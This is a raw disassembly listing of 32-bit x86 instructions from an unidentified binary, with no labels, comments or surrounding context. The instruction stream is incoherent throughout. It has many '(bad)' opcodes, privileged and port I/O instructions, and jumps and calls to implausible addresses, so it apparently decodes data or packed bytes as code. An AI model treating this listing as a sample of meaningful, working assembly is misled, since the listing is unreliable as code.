  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
